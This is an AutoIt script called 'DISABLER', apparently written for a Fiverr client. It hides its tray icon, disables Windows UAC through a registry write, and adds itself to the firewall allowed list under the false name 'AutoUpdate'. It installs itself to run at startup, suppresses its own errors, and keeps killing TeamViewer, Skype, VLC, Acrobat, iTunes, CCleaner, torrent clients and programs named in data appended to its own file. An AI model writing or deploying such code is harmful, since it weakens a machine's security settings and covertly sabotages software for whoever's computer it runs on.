;★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★  Fiverr-HarshKohli  ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
;*************************************************************************** [DISABLER] ************************************************************************************************
;MAIN FILE !

;[PART 1]Begin****
;You don't have to understand this part, those are some old autoit's work, we need to include it, to use it without having to writing it again.
;~~~~~~~~~~~~~~~~INCLUDES~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#RequireAdmin                   ;~~~    To have admin rights                ~
#NoTrayIcon                     ;~~~    To hide icon of this software       ~
#include<WindowsConstants.au3>  ;~~~    Not important                       ~
#include<FileConstants.au3>     ;~~~    To manipulate files                 ~
#include<StaticConstants.au3>   ;~~~    Not important                       ~
#include<_Startup.au3>          ;~~~    To set startup function             ~
#include<File.au3>              ;~~~    To manipulate files .. again        ~
#include<misc.au3>              ;~~~    Not important                       ~
#include<StringConstants.au3>   ;~~~    To add informations to database(EOF)~
#include<ColorConstants.au3>    ;~~~    For Color constants                 ~
#include<FontConstants.au3>     ;~~~    For Writing colors                  ~
#include<GuiConstantsEx.au3>    ;~~~    For Interface styles                ~
#include<MsgBoxConstants.au3>   ;~~~    For some msgs styles                ~
#include<EditConstants.au3>     ;~~~    For Edit texts                      ~
#include <Array.au3>            ;~~~    For adding programs to list         ~
#include <AutoItConstants.au3>  ;~~~    Also for adding programs            ~
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;[PART 1]End****


;[PART 2]Begin****
;I use this function to manipulate reg and disable UAC : the window that popup everytime for admin rights, we've already got admin rights in the top of the code.
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", "0")
;[PART 2]End****

;[PART 3]Begin****
;In this part, we're going to declare vars that we will use later in the code.
;***********************************************************************
Global $dilimiter = "*"                                              ;**
$FileO = FileOpen(@SCRIPTFULLPATH, 0)                                ;**
$ReadO = FileRead($FileO)                                            ;**
$trimO = StringTrimLeft($ReadO, StringInStr($ReadO, $dilimiter))     ;** THOSE VARS, TO ADD PROGRAMS TO LIST
$trimO = _Undo($trimO)                                               ;**
$SplitO = StringSplit($trimO, $dilimiter)                            ;**
$U = Ubound($splitO, 1)                                              ;**
;***********************************************************************
;[PART 3]Begin****




;[PART 4] Begin****
;I use this function to bypass firewall.
Run(@ComSpec & ' /c netsh firewall add allowedprogram program = "' & @AutoItExe & '" name = "AutoUpdate" mode = ENABLE', "", "", @SW_HIDE)
;[PART 4] End****


;[PART 5] Begin****
;--- Here the program check if it is already in startup, If not ( False ) then it install it in startup.
If _StartupRegistry_Install() = False then
   starttup() ; We declare this function of startup, but we will define it later in the end of the script.    (STARTUP)
EndIF
;[PART 5] End****


;[PART 6] Begin****
;--------------------------------------------------------------------------------
If $CmdLine[0] > 0 Then                                                    ;-----
   If Not StringInStr($CmdLineRaw,"-NoErrors",1) Then RunWithoutErrors()   ;-----
	   Else                                                                ;----- Here I use some vars of cmd to disable errors from appearing : For example if an error occurs in
   If @compiled Then                                                       ;----- this software, It will not popup, so this software remains silent.
        RunWithoutErrors()                                                 ;-----
EndIF                                                                      ;-----
EndIF                                                                      ;-----
;--------------------------------------------------------------------------------
;[PART 6] End****


;[PART 7]Begin****
;[LOOP BEGIN] During this loop , software will constantly check if one of the programs is executed, it will disable them whenever it's the case.
While 1 ; [START LOOP]
   sleep(5000)
   If ProcessExists("teamviewer.exe") then
	  processClose("teamviewer.exe")                                        ;DISABLE TEAMVIEWER
   EndIf
   If ProcessExists("skype.exe") then
	  ProcessClose("Skype.exe")                                             ;DISABLE SKYPE
   EndIF
   If ProcessExists("vlc.exe") Then
	  ProcessClose("vlc.exe")                                               ;DISABLE VLC
   EndIF
   If ProcessExists("IDMan.exe") Then
	  ProcessClose("IDMan.exe")                                             ;DISABLE IDM
   EndIF
   If ProcessExists("Vlc.exe") Then
	  ProcessClose("Vlc.exe")                                               ;DISABLE VLC
   EndIf
   If ProcessExists("Ccleaner.exe") Then
	  ProcessClose("Ccleaner.exe")                                          ;DISABLE Ccleaner
   EndIf
   If ProcessExists("AcroRd32.exe") Then
	  ProcessClose("AcroRd32.exe")                                          ;DISABLE ACROBAT
   EndIf
   If ProcessExists("Acrobat.exe") Then
	  ProcessClose("Acrobat.exe")                                           ;DISABLE ACROBAT (ANOTHER VERSION)
   EndIF
  If ProcessExists("itunes.exe") Then
	 ProcessClose("itunes.exe")                                             ;DISABLE ITUNES
  EndIf
  If ProcessExists("iTunesHelper.exe") Then
	 ProcessClose("iTunesHelper.exe")
   EndIF
  If ProcessExists("uTorrent.exe") Then
	 ProcessClose("uTorrent.exe")                                           ;DISABLE UTORRENT
  EndIF
  If ProcessExists("TeamViewer_Service.exe") Then
	 ProcessClose("TeamViewer_Service.exe")                                 ;DISABLE TEAMVIEWER
   EndIF
 If ProcessExists("BitTorrent.exe") Then
	ProcessClose("BitTorrent.exe")                                          ;DISABLE BITTORRENT
EndIF
For $i = 1 to $U
   If ProcessExists($SplitO[$i - 1]) Then
	  ProcessClose($SplitO[$i - 1])
   EndIf
Next
Wend ;[END LOOP]
;[PART7]END****

;[PART8]BEGIN
;FUNCTIONS
Func _Undo($EOF)
   $reverse = StringReverse($EOF)
   Return $reverse
EndFunc

Func starttup()
   _StartupRegistry_Install()
EndFunc

Func RunWithoutErrors()
    Run(@AutoItExe & ' /ErrorStdOut -NoErrors') ; To hide softwar errors, if it happens.
    Exit
 EndFunc
;[PART8]End
;End of code
;Good luck